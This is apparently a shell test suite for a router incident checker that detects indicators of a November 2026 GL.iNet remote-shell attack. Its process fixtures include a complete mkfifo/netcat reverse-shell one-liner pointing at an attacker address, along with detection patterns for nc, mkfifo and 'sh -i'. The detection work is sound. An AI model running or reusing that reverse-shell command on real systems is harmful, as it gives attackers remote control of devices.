#!/bin/sh
# `gl-portable-backup check`: the November 2026 incident indicators, one by one and with their near
# misses; a check that cannot read the process list never reports "none"; a router restarted since
# the attack window is "inconclusive"; netstat is never run; the GoodCloud switch is reported as true,
# false or null; and no command line or connection address reaches the output.
. "$(dirname "$0")/../lib.sh"
load_backend
not_contains() { case "$1" in *"$2"*) echo "  not_contains FAILED (${3:-}): [$2] is present"; exit 1;; esac; }

R="$T/root"
export MOCK_NETSTAT_MARK="$T/netstat-ran"
PSF="$T/ps.txt"
# A shell function named netstat catches a bare `netstat` call under BusyBox sh too, where an applet
# would otherwise run instead of the mock on PATH.
run_check() {   # -> stdout in $out, status in $rc
    rc=0
    out=$(sh -c 'netstat() { : > "$MOCK_NETSTAT_MARK"; }; . "$0"; cmd_check' "$BACKEND" 2>"$T/err") || rc=$?
}
ps_lines() {   # LINE... — the process list the ps mock prints, after a BusyBox header
    printf '%s\n' '  PID USER       VSZ STAT COMMAND' '    1 root      1500 S    /sbin/procd' "$@" > "$PSF"
    export MOCK_PS_FILE="$PSF"
}
ps_default() { unset MOCK_PS_FILE MOCK_PS_RC; }
cc_ids() {   # the cannot_clear ids of $out, space-separated, in order
    local i=0 id acc=""
    while id=$(printf '%s' "$out" | jsonfilter -e "@.cannot_clear[$i].id" 2>/dev/null); do
        acc="${acc:+$acc }$id"; i=$((i + 1))
    done
    printf '%s' "$acc"
}
cc_detail_of() { printf '%s' "$out" | jsonfilter -e "@.cannot_clear[$1].detail"; }
ids() {   # the indicator ids of $out, space-separated, in order
    local i=0 id acc=""
    while id=$(printf '%s' "$out" | jsonfilter -e "@.indicators[$i].id" 2>/dev/null); do
        acc="${acc:+$acc }$id"; i=$((i + 1))
    done
    printf '%s' "$acc"
}
expect_none() {   # WHAT
    run_check
    assert_eq "$rc" 0 "$1: exit code"
    assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "none" "$1: result"
    assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.indicators')" "[]" "$1: indicators"
}
expect_ids() {   # WHAT IDS
    run_check
    assert_eq "$rc" 3 "$1: exit code"
    assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "indicators" "$1: result"
    assert_eq "$(ids)" "$2" "$1: ids"
}
detail_of() { printf '%s' "$out" | jsonfilter -e "@.indicators[$1].detail"; }

NOTE_NONE='No known indicator was found. This does not show the router was never compromised: the known remote shell leaves no file and is gone after a reboot.'
NOTE_IND='Indicators of the November 2026 GL.iNet cloud incident were found. Treat every key and password on this router as exposed.'

# ─── 1. nothing found: one line of JSON, exit 0 ───────────────────────────────
ps_default
expect_none "empty root"
assert_eq "$(printf '%s\n' "$out" | wc -l)" 1 "one line of output"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.note')" "$NOTE_NONE" "note (none)"
printf '%s' "$out" | command grep -q -F '"goodcloud_enabled":null' || { echo "  goodcloud_enabled is not null: $out"; exit 1; }
printf '%s' "$(printf '%s' "$out" | jsonfilter -e '@.checked_at')" | command grep -q -E '^[0-9]{4}-[0-9]{2}-[0-9]{2}T[0-9]{2}:[0-9]{2}:[0-9]{2}Z$' \
    || { echo "  checked_at is not a UTC ISO time: $out"; exit 1; }
not_contains "$out" "clean" "never calls the router clean"
not_contains "$out" "safe" "never calls the router safe"

# ─── 2. processes, from /proc/<pid>/cmdline ───────────────────────────────────
# procs LINE... — replaces the synthetic process table: pid 1 is procd, then one process per LINE,
# its arguments separated by NULs (each space in LINE becomes a NUL; the check turns them back).
procs() {
    rm -rf "$R"/proc/[0-9]*
    mkdir -p "$R/proc/1"; printf '/sbin/procd\000' > "$R/proc/1/cmdline"
    local n=2000 l
    for l in "$@"; do
        n=$((n + 1)); mkdir -p "$R/proc/$n"
        printf '%s\000' "$l" | tr ' ' '\000' > "$R/proc/$n/cmdline"
    done
    mkdir -p "$R/proc/2"; : > "$R/proc/2/cmdline"   # a kernel thread: empty cmdline
}
procs
expect_none "procd and a kernel thread"

# Written with printf and explicit NULs, as the kernel stores it.
mkdir -p "$R/proc/3001"; printf 'crond\000-i\000/tmp/.log\000' > "$R/proc/3001/cmdline"
expect_ids "crond -i" "proc-crond-log"
assert_eq "$(detail_of 0)" "a process matching GL.iNet's published indicator (crond -i /tmp/.log) is running" "crond detail"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.note')" "$NOTE_IND" "note (indicators)"

LONG="sh -c iptables -t nat -A SDWAN_IP_MAPPING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1;(while true;do rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 170.39.226.219 42499 >/tmp/f;sleep 3;done) >/dev/null 2>&1 &"
for line in 'mkfifo /tmp/f' 'nc 170.39.226.219 42499' '/usr/bin/nc 10.0.0.1 4444' '/bin/sh -i' 'sh -i' "$LONG"; do
    procs "$line"
    expect_ids "remote shell [$line]" "proc-remote-shell"
    assert_eq "$(detail_of 0)" "a process matching the remote shell seen on GL-AXT1800 routers is running" "remote shell detail"
    not_contains "$out" "170.39.226.219" "no address from a command line in the output"
    not_contains "$out" "/tmp/f;" "no command line in the output"
done
# The long line's patterns sit past column 132, where BusyBox `ps w` cuts: /proc sees them. Here only
# its tail is matchable: the pipe and mkfifo are removed from the head.
TAIL="sh -c iptables -t nat -A SDWAN_IP_MAPPING -d 127.0.0.1 -j DNAT --to-destination 127.0.0.1;(while true;do rm -f /tmp/x;sleep 3;cat /tmp/x|/bin/sh -i 2>&1)"
[ "${#TAIL}" -gt 132 ] || { echo "  fixture too short"; exit 1; }
procs "$TAIL"
expect_ids "pattern beyond column 132" "proc-remote-shell"

procs 'crond -i /tmp/.log' '/bin/sh -i'
expect_ids "both process indicators" "proc-crond-log proc-remote-shell"

# Near misses. The firmware's own cron lines are as read in `ps w` on GL-MT3600BE 4.9.0 (BusyBox
# 1.33.2). `sh -i` and `nc` only count after the start of a word or one of / | ; & (, so `ssh -i KEY
# HOST` and `bash -i` (and `sync -i`) are not the remote shell; `nc` needs an IPv4 address and a port.
for line in '/usr/sbin/crond -f -c /etc/crontabs -l 5' \
            '/usr/sbin/crond -f -c /tmp/gl_crontabs -l 5' \
            '/usr/sbin/crond -f -c /tmp/gl_crontabs -l 10' \
            'ash -c gl-portable-backup check' \
            'ssh -i /root/.ssh/id_dropbear backup@example.org' \
            'bash -i' 'sync -i' 'nc -l -p 8080' 'rsync 10.0.0.1:/x /y' \
            '/usr/sbin/dnsmasq -C /var/etc/dnsmasq.conf'; do
    procs "$line"
    expect_none "near miss [$line]"
done

# Only this tool's own process and its ancestors are left out. A process that merely names this tool
# is matched like any other: otherwise an attacker's process could hide by carrying the name.
procs 'ash -c gl-portable-backup check; ps w | grep -E "crond -i|mkfifo|nc [0-9]|sh -i"'
expect_ids "a process naming this tool, not an ancestor" "proc-crond-log proc-remote-shell"
procs 'sh -c echo gl-portable-backup >/dev/null; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1'
expect_ids "an attacker's process carrying this tool's name" "proc-remote-shell"

# A synthetic chain of three ancestors above this shell: its parent, a grandparent and a
# great-grandparent, each with a matching command line and a stat whose command name holds spaces
# and parentheses. None of them is matched; a sibling with the same command line is.
procs
QUOTE='ash -c ps w | grep -E "crond -i|mkfifo|sh -i"; true'
rc=0; out=$(Q="$QUOTE" sh -c 'P=$GPB_ROOT/proc
    mkdir -p "$P/$$" "$P/$PPID" "$P/7001" "$P/7002"
    printf "/bin/sh -i\000" > "$P/$$/cmdline"
    printf "%s\000" "$Q" > "$P/$PPID/cmdline"
    printf "%s (ash -c (x) y) S 7001 1 1 0 -1\n" "$PPID" > "$P/$PPID/stat"
    printf "crond\000-i\000/tmp/.log\000" > "$P/7001/cmdline"
    printf "7001 (a) b (c) S 7002 1 1 0 -1\n" > "$P/7001/stat"
    printf "mkfifo\000/tmp/f\000" > "$P/7002/cmdline"
    printf "7002 (dropbear) S 0 1 1 0 -1\n" > "$P/7002/stat"
    . "$0"; cmd_check' "$BACKEND" 2>/dev/null) || rc=$?
assert_eq "$rc" 0 "own process and three ancestors left out (exit code)"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "none" "own process and three ancestors left out"
rm -rf "$R"/proc/[0-9]*; procs "$QUOTE"
expect_ids "a quoting shell that is not an ancestor" "proc-crond-log proc-remote-shell"
# The walk itself: the chain read through command names with spaces and parentheses.
procs
anc=$(sh -c 'P=$GPB_ROOT/proc; mkdir -p "$P/$PPID" "$P/7001" "$P/7002"
    printf "%s ((x)) y) S 7001 1\n" "$PPID" > "$P/$PPID/stat"
    printf "7001 (a b) S 7002 1\n" > "$P/7001/stat"
    printf "7002 (c) R 0 1\n" > "$P/7002/stat"
    . "$0"; printf "%s|%s|%s" "$(ic_ancestors)" "$$" "$PPID"' "$BACKEND")
self=$(printf '%s' "$anc" | cut -d'|' -f2); par=$(printf '%s' "$anc" | cut -d'|' -f3)
assert_eq "$(printf '%s' "$anc" | cut -d'|' -f1)" " $self $par 7001 7002 " "ancestor walk through odd command names"
procs

# ─── 3. what the check cannot read makes it inconclusive, never none ──────────
expect_inconclusive() {   # WHAT CANNOT-CLEAR-IDS
    run_check
    assert_eq "$rc" 0 "$1: exit code"
    assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "inconclusive" "$1: result"
    assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.indicators')" "[]" "$1: no strong indicator"
    assert_eq "$(cc_ids)" "$2" "$1: cannot_clear ids"
}
rm -rf "$R"/proc/[0-9]*
ps_default
expect_inconclusive "no cmdline under /proc: ps fallback" "check-incomplete"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.note')" "No strong indicator was found, but this router cannot be cleared: the check could not read the process command lines under /proc, and ps w, read instead, can hide the end of a long command line. If you have any other reason to suspect it, treat it as compromised." "inconclusive note (incomplete)"
ps_lines ' 2001 root      1072 S    crond -i /tmp/.log' '@PARENT@ root      1072 S    ash -c sh -i'
rc=0; out=$(sh -c 'export MOCK_PS_PARENT=$PPID; . "$0"; cmd_check' "$BACKEND" 2>/dev/null) || rc=$?
assert_eq "$rc" 3 "fallback exit code: a real indicator wins"
assert_eq "$(ids)" "proc-crond-log" "the fallback still matches, parent left out"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "indicators" "indicators win over incomplete"
ps_default; export MOCK_PS_RC=1
expect_inconclusive "ps fails too" "check-incomplete check-incomplete"
assert_contains "$(printf '%s' "$out" | jsonfilter -e '@.note')" "can hide the end of a long command line; the check could not read the process list from ps either." "both details, joined with a semicolon"
unset MOCK_PS_RC
GPB_TEST_PS="$T/no-such-ps"; export GPB_TEST_PS
expect_inconclusive "ps absent" "check-incomplete check-incomplete"
GPB_TEST_PS="$HERE/tests/mocks/ps"; export GPB_TEST_PS
procs
mv "$R/proc/net/tcp" "$R/proc/net/tcp.off"
expect_inconclusive "no TCP table" "check-incomplete"
mv "$R/proc/net/tcp.off" "$R/proc/net/tcp"
expect_none "processes and TCP table back"
printf '%s' "$out" | command grep -q -F '"cannot_clear":[]' || { echo "  cannot_clear not an empty list: $out"; exit 1; }

# ─── 4. /tmp ──────────────────────────────────────────────────────────────────
mkdir -p "$R/tmp"
echo x > "$R/tmp/f"
expect_none "/tmp/f regular file"
rm -f "$R/tmp/f"; mkfifo "$R/tmp/f"
expect_ids "/tmp/f fifo" "tmp-fifo"
assert_eq "$(detail_of 0)" "/tmp/f is a named pipe: the remote shell has run since the last boot" "fifo detail"
rm -f "$R/tmp/f"
: > "$R/tmp/.log"
expect_ids "/tmp/.log" "tmp-log"
assert_eq "$(detail_of 0)" "/tmp/.log exists" "tmp-log detail"
rm -f "$R/tmp/.log"; mkdir "$R/tmp/.log"
expect_ids "/tmp/.log directory" "tmp-log"
rm -rf "$R/tmp/.log"
expect_none "/tmp emptied"

# ─── 5. netstat ───────────────────────────────────────────────────────────────
mkdir -p "$R/bin" "$R/rom/bin" "$R/usr/bin" "$R/rom/usr/bin" "$R/sbin" "$R/usr/sbin"
ln -s busybox "$R/bin/netstat"
expect_none "netstat -> busybox (as on GL-MT3600BE 4.9.0, no other netstat)"
rm -f "$R/bin/netstat"; ln -s /bin/busybox "$R/bin/netstat"
expect_none "netstat -> /bin/busybox"
rm -f "$R/bin/netstat"; echo firmware > "$R/bin/netstat"; echo firmware > "$R/rom/bin/netstat"
expect_none "netstat regular file identical to /rom"
echo replaced > "$R/bin/netstat"
expect_ids "netstat differs from /rom" "netstat-replaced"
assert_eq "$(detail_of 0)" "netstat at /bin/netstat is not the firmware's own" "netstat detail"
rm -f "$R/bin/netstat" "$R/rom/bin/netstat"; ln -s /tmp/x "$R/bin/netstat"
expect_ids "netstat -> something else" "netstat-replaced"
rm -f "$R/bin/netstat"
echo replaced > "$R/usr/bin/netstat"
expect_ids "netstat with no /rom copy" "netstat-replaced"
assert_eq "$(detail_of 0)" "netstat at /usr/bin/netstat is not the firmware's own" "netstat detail (/usr/bin)"
rm -f "$R/usr/bin/netstat"
ln -s busybox "$R/sbin/netstat"; echo x > "$R/usr/sbin/netstat"
expect_ids "two netstat paths" "netstat-replaced"
assert_eq "$(detail_of 0)" "netstat at /usr/sbin/netstat is not the firmware's own" "only the replaced one is named"
rm -f "$R/sbin/netstat" "$R/usr/sbin/netstat"
assert_no_file "$MOCK_NETSTAT_MARK"

# ─── 6. marker directories ────────────────────────────────────────────────────
mkdir -p "$R/etc/config/.gl"
expect_ids "/etc/config/.gl" "marker-dir"
assert_eq "$(detail_of 0)" "/etc/config/.gl exists (removed by the cleanup in GL.iNet's KVM firmware)" "marker detail"
mkdir -p "$R/etc/glinet/.cache"
expect_ids "both marker paths" "marker-dir marker-dir"
assert_eq "$(detail_of 1)" "/etc/glinet/.cache exists (removed by the cleanup in GL.iNet's KVM firmware)" "second marker detail"
rm -rf "$R/etc/config/.gl" "$R/etc/glinet"

# ─── 7. boot scripts named in an unconfirmed report ───────────────────────────
mkdir -p "$R/etc/init.d" "$R/rom/etc/init.d" "$R/lib/upgrade/keep.d" "$R/rom/lib/upgrade/keep.d"
echo seed > "$R/etc/init.d/urandom_seed"
expect_none "urandom_seed with no /rom copy"
echo seed > "$R/rom/etc/init.d/urandom_seed"
expect_none "urandom_seed identical to /rom"
echo changed > "$R/etc/init.d/urandom_seed"
expect_ids "urandom_seed differs" "boot-script-changed"
assert_eq "$(detail_of 0)" "/etc/init.d/urandom_seed differs from the firmware's copy (named in an unconfirmed report)" "boot script detail"
rm -f "$R/etc/init.d/urandom_seed" "$R/rom/etc/init.d/urandom_seed"
echo a > "$R/lib/upgrade/keep.d/netifd"; echo a > "$R/rom/lib/upgrade/keep.d/netifd"
expect_none "keep.d/netifd identical"
echo b >> "$R/lib/upgrade/keep.d/netifd"
expect_ids "keep.d/netifd differs" "boot-script-changed"
rm -f "$R/lib/upgrade/keep.d/netifd" "$R/rom/lib/upgrade/keep.d/netifd"
# As on GL-MT3600BE 4.9.0: both files present, both identical to their /rom copies.
echo seed > "$R/etc/init.d/urandom_seed"; cp "$R/etc/init.d/urandom_seed" "$R/rom/etc/init.d/urandom_seed"
echo keep > "$R/lib/upgrade/keep.d/netifd"; cp "$R/lib/upgrade/keep.d/netifd" "$R/rom/lib/upgrade/keep.d/netifd"
expect_none "both boot files identical to /rom"
rm -f "$R/etc/init.d/urandom_seed" "$R/rom/etc/init.d/urandom_seed" "$R/lib/upgrade/keep.d/netifd" "$R/rom/lib/upgrade/keep.d/netifd"

# ─── 7b. the firewall rule the attack leaves ──────────────────────────────────
export MOCK_IPTABLES_FILE="$T/ipt.txt" MOCK_NFT_FILE="$T/nft.txt"
printf '%s\n' '-N SDWAN_IP_MAPPING' '-A SDWAN_IP_MAPPING -d 127.0.0.1/32 -j DNAT --to-destination 127.0.0.1' > "$MOCK_IPTABLES_FILE"
expect_ids "iptables loopback DNAT" "nat-loopback-rule"
assert_eq "$(detail_of 0)" "a firewall rule left by the remote-shell attack is present (it stays after the shell is stopped, until a reboot)" "rule detail"
printf '%s\n' '-N SDWAN_IP_MAPPING' '-A SDWAN_IP_MAPPING -d 10.0.0.5/32 -j DNAT --to-destination 192.168.8.5' > "$MOCK_IPTABLES_FILE"
expect_none "an ordinary mapping rule"
printf '%s\n' '-A SDWAN_IP_MAPPING -d 127.0.0.10/32 -j DNAT --to-destination 127.0.0.10' > "$MOCK_IPTABLES_FILE"
expect_none "127.0.0.10 is not 127.0.0.1"
printf '%s\n' '-A SDWAN_IP_MAPPING -d 127.0.0.1/32 -j DNAT --to-destination 127.0.0.10' > "$MOCK_IPTABLES_FILE"
expect_none "a DNAT to 127.0.0.10 is not to 127.0.0.1"
: > "$MOCK_IPTABLES_FILE"
cat > "$MOCK_NFT_FILE" <<'NFT'
table ip nat {
	chain SDWAN_IP_MAPPING {
		ip daddr 127.0.0.1 counter packets 0 bytes 0 dnat to 127.0.0.1
	}
}
NFT
expect_ids "nft loopback DNAT" "nat-loopback-rule"
cat > "$MOCK_NFT_FILE" <<'NFT'
table ip nat {
	chain SDWAN_IP_MAPPING {
	}
	chain other {
		ip daddr 127.0.0.1 dnat to 127.0.0.1
	}
}
NFT
expect_none "the rule in another chain"
: > "$MOCK_NFT_FILE"
unset MOCK_IPTABLES_FILE MOCK_NFT_FILE

# ─── 7c. /etc/mp_ip_mapping_info ──────────────────────────────────────────────
F="$R/etc/mp_ip_mapping_info"
: > "$F"; TZ=UTC0 touch -d '2026-11-20 22:15:18' "$F"
# Cannot clear, not strong: the file shows the abused handler ran, not that the router was compromised.
expect_inconclusive "mapping file written in the window" "mp-ip-mapping-file"
assert_eq "$(cc_detail_of 0)" "/etc/mp_ip_mapping_info was written on or after 2026-11-20 although multi-path tunnelling is off: the cloud client's handler that the attack used has run on this router. This is also the only trace of it that survives a restart." "mapping detail"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.note')" "No strong indicator was found, but this router cannot be cleared: $(cc_detail_of 0). If you have any other reason to suspect it, treat it as compromised." "inconclusive note (mapping file)"
TZ=UTC0 touch -d '2026-11-20 00:00:00' "$F"
expect_inconclusive "mapping file at the window's first second" "mp-ip-mapping-file"
procs 'crond -i /tmp/.log'
expect_ids "mapping file and a strong indicator: indicators" "proc-crond-log"
assert_eq "$(cc_ids)" "mp-ip-mapping-file" "the mapping file still listed under cannot_clear"
procs
TZ=UTC0 touch -d '2026-11-19 23:59:00' "$F"
expect_none "mapping file written before 2026-11-20"
TZ=UTC0 touch -d '2026-11-21 08:00:00' "$F"
echo 'mptun.global.enable=1' > "$MOCK_UCI_FILE"
expect_none "mapping file while multi-path tunnelling is on"
: > "$MOCK_UCI_FILE"; rm -f "$F"

# ─── 7d. a connection to the attack's address range ───────────────────────────
TCPH='  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode'
printf '%s\n' "$TCPH" '   0: 0108A8C0:D2F4 DBE227AA:A603 01 00000000:00000000 00:00000000 00000000     0        0 1 1' > "$R/proc/net/tcp"
expect_ids "170.39.226.219, little-endian" "conn-attacker-range"
assert_eq "$(detail_of 0)" "an open connection to the address range used in the remote-shell attack (170.39.226.0/24)" "conn detail"
not_contains "$out" "170.39.226.219" "the peer address is not printed"
printf '%s\n' "$TCPH" '   0: 0108A8C0:D2F4 dbe227aa:A603 01 0 0 0 0 0 1 1' > "$R/proc/net/tcp"
expect_ids "lower-case hex" "conn-attacker-range"
printf '%s\n' "$TCPH" '   0: C0A80801:D2F4 AA27E2DB:A603 01 0 0 0 0 0 1 1' > "$R/proc/net/tcp"
expect_ids "big-endian" "conn-attacker-range"
printf '%s\n' "$TCPH" '   0: DBE227AA:0016 0108A8C0:D2F4 01 0 0 0 0 0 1 1' \
    '   1: 0108A8C0:D2F4 DBE327AA:A603 01 0 0 0 0 0 1 1' '   2: 0108A8C0:D2F4 DBE227AB:A603 01 0 0 0 0 0 1 1' > "$R/proc/net/tcp"
expect_none "the range only as a local address, and its neighbours 170.39.227.x and 171.39.226.x"
printf '%s\n' "$TCPH" > "$R/proc/net/tcp"

# ─── 7e. /etc/udhcpc.user.d ───────────────────────────────────────────────────
mkdir -p "$R/etc/udhcpc.user.d" "$R/rom/etc/udhcpc.user.d"
echo hook > "$R/etc/udhcpc.user.d/10-gl"; cp "$R/etc/udhcpc.user.d/10-gl" "$R/rom/etc/udhcpc.user.d/10-gl"
expect_none "udhcpc hook identical to /rom"
echo changed >> "$R/etc/udhcpc.user.d/10-gl"
expect_ids "udhcpc hook differs" "udhcpc-user-changed"
assert_eq "$(detail_of 0)" "/etc/udhcpc.user.d/10-gl differs from the firmware's copy (named in an unconfirmed report)" "udhcpc detail"
cp "$R/rom/etc/udhcpc.user.d/10-gl" "$R/etc/udhcpc.user.d/10-gl"
# A hook with no firmware copy is a plugin's own (third-party plugins install hooks here): no entry.
echo x > "$R/etc/udhcpc.user.d/99-new"
expect_none "udhcpc hook with no /rom copy"
rm -rf "$R/etc/udhcpc.user.d" "$R/rom/etc/udhcpc.user.d"

# ─── 7f. restarted since the attack window: inconclusive, never none ──────────
NOW=$(date -u +%s)
WINDOW=1795207620   # 2026-11-20 20:47:00 UTC
echo "$(( NOW - WINDOW + 3600 )).52 1.00" > "$R/proc/uptime"
run_check
assert_eq "$rc" 0 "not restarted: exit code"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "none" "not restarted: none"
printf '%s' "$out" | command grep -q -F '"rebooted_since_incident":false' || { echo "  rebooted not false: $out"; exit 1; }
printf '%s' "$(printf '%s' "$out" | jsonfilter -e '@.uptime_since')" | command grep -q -E '^2026-11-20T1[0-9]:[0-9]{2}:[0-9]{2}Z$' \
    || { echo "  uptime_since is not the boot time: $out"; exit 1; }
echo "600.00 1.00" > "$R/proc/uptime"
run_check
assert_eq "$rc" 0 "restarted: exit code 0"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "inconclusive" "restarted, nothing found: inconclusive"
printf '%s' "$out" | command grep -q -F '"rebooted_since_incident":true' || { echo "  rebooted not true: $out"; exit 1; }
assert_eq "$(cc_ids)" "restarted-since-incident" "restarted: cannot_clear id"
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.note')" "No strong indicator was found, but this router cannot be cleared: the router has restarted since the attack window (from about 20:47 UTC on 2026-11-20), and the remote shell and its traces do not survive a restart. If you have any other reason to suspect it, treat it as compromised." "inconclusive note (restart)"
procs 'crond -i /tmp/.log'
expect_ids "restarted with an indicator" "proc-crond-log"
procs
rm -f "$R/proc/uptime"
run_check
printf '%s' "$out" | command grep -q -F '"uptime_since":null,"rebooted_since_incident":null' || { echo "  unknown uptime not null: $out"; exit 1; }
assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "none" "unknown uptime stays none"

# ─── 7g. every time is UTC, whatever the router's time zone ──────────────────
# TZ=MST7 is seven hours behind UTC, as on the test unit. 2026-11-20T00:30:00Z is 2026-11-19 17:30
# local time and must count; 2026-11-19T23:30:00Z must not.
F="$R/etc/mp_ip_mapping_info"; : > "$F"
TZ=UTC0 touch -d '2026-11-20 00:30:00' "$F"
rc=0; out=$(TZ=MST7 sh -c '. "$0"; cmd_check' "$BACKEND" 2>/dev/null) || rc=$?
assert_eq "$(cc_ids)" "mp-ip-mapping-file" "00:30Z counts under TZ=MST7"
TZ=UTC0 touch -d '2026-11-19 23:30:00' "$F"
rc=0; out=$(TZ=MST7 sh -c '. "$0"; cmd_check' "$BACKEND" 2>/dev/null) || rc=$?
assert_eq "$rc" 0 "23:30Z the day before does not count under TZ=MST7"
rm -f "$F"
NOW=$(date -u +%s)
echo "$(( NOW - 1795207620 + 3600 )).00 1.00" > "$R/proc/uptime"
want=$(date -u -d "@1795204020" +%Y-%m-%dT%H:%M 2>/dev/null)
h1=$(date -u +%Y-%m-%dT%H)
rc=0; out=$(TZ=MST7 sh -c '. "$0"; cmd_check' "$BACKEND" 2>/dev/null) || rc=$?
h2=$(date -u +%Y-%m-%dT%H)
assert_contains "$(printf '%s' "$out" | jsonfilter -e '@.uptime_since')" "$want" "uptime_since is UTC under TZ=MST7"
ca=$(printf '%s' "$out" | jsonfilter -e '@.checked_at')
case "$ca" in "$h1":*Z|"$h2":*Z) ;; *) echo "  checked_at is not UTC under TZ=MST7: $ca (UTC hour $h1)"; exit 1;; esac
printf '%s' "$out" | command grep -q -F '"rebooted_since_incident":false' || { echo "  window boundary read in local time: $out"; exit 1; }
echo "$(( NOW - 1795207620 - 600 )).00 1.00" > "$R/proc/uptime"
rc=0; out=$(TZ=MST7 sh -c '. "$0"; cmd_check' "$BACKEND" 2>/dev/null) || rc=$?
printf '%s' "$out" | command grep -q -F '"rebooted_since_incident":true' || { echo "  boot ten minutes after the boundary not seen under TZ=MST7: $out"; exit 1; }
# The window opens at 20:47 UTC: a boot at 20:47:30 is after it, a boot at 20:46:30 is not.
NOW=$(date -u +%s)
echo "$(( NOW - 1795207650 )).00 1.00" > "$R/proc/uptime"
run_check; assert_eq "$(cc_ids)" "restarted-since-incident" "boot at 20:47:30 UTC is after the window opened"
echo "$(( NOW - 1795207590 )).00 1.00" > "$R/proc/uptime"
run_check; assert_eq "$(printf '%s' "$out" | jsonfilter -e '@.result')" "none" "boot at 20:46:30 UTC is before it"
rm -f "$R/proc/uptime"

# ─── 8. GoodCloud switch ──────────────────────────────────────────────────────
echo 'gl-cloud.@cloud[0].enable=1' > "$MOCK_UCI_FILE"
run_check; printf '%s' "$out" | command grep -q -F '"goodcloud_enabled":true' || { echo "  goodcloud not true: $out"; exit 1; }
echo 'gl-cloud.@cloud[0].enable=0' > "$MOCK_UCI_FILE"
run_check; printf '%s' "$out" | command grep -q -F '"goodcloud_enabled":false' || { echo "  goodcloud not false: $out"; exit 1; }
echo 'gl-cloud.@cloud[0].enable=yes' > "$MOCK_UCI_FILE"
run_check; printf '%s' "$out" | command grep -q -F '"goodcloud_enabled":null' || { echo "  goodcloud not null: $out"; exit 1; }
: > "$MOCK_UCI_FILE"

# ─── 9. every indicator at once: still one line of valid JSON ─────────────────
procs 'crond -i /tmp/.log' '/bin/sh -i'
printf '%s\n' "$TCPH" '   0: 0108A8C0:D2F4 DBE227AA:A603 01 0 0 0 0 0 1 1' > "$R/proc/net/tcp"
printf '%s\n' '-A SDWAN_IP_MAPPING -d 127.0.0.1/32 -j DNAT --to-destination 127.0.0.1' > "$T/ipt.txt"; export MOCK_IPTABLES_FILE="$T/ipt.txt"
: > "$R/etc/mp_ip_mapping_info"; mkdir -p "$R/etc/udhcpc.user.d" "$R/rom/etc/udhcpc.user.d"
echo x > "$R/etc/udhcpc.user.d/x"; echo y > "$R/rom/etc/udhcpc.user.d/x"
mkfifo "$R/tmp/f"; : > "$R/tmp/.log"; echo x > "$R/bin/netstat"; mkdir -p "$R/etc/config/.gl"
echo a > "$R/etc/init.d/urandom_seed"; echo b > "$R/rom/etc/init.d/urandom_seed"
expect_ids "all indicators" "proc-crond-log proc-remote-shell tmp-fifo tmp-log netstat-replaced marker-dir boot-script-changed nat-loopback-rule conn-attacker-range udhcpc-user-changed"
assert_eq "$(cc_ids)" "mp-ip-mapping-file" "all indicators: the mapping file under cannot_clear"
assert_eq "$(printf '%s\n' "$out" | wc -l)" 1 "one line of output (all indicators)"
assert_no_file "$MOCK_NETSTAT_MARK"
echo "ok 47-incident-check"
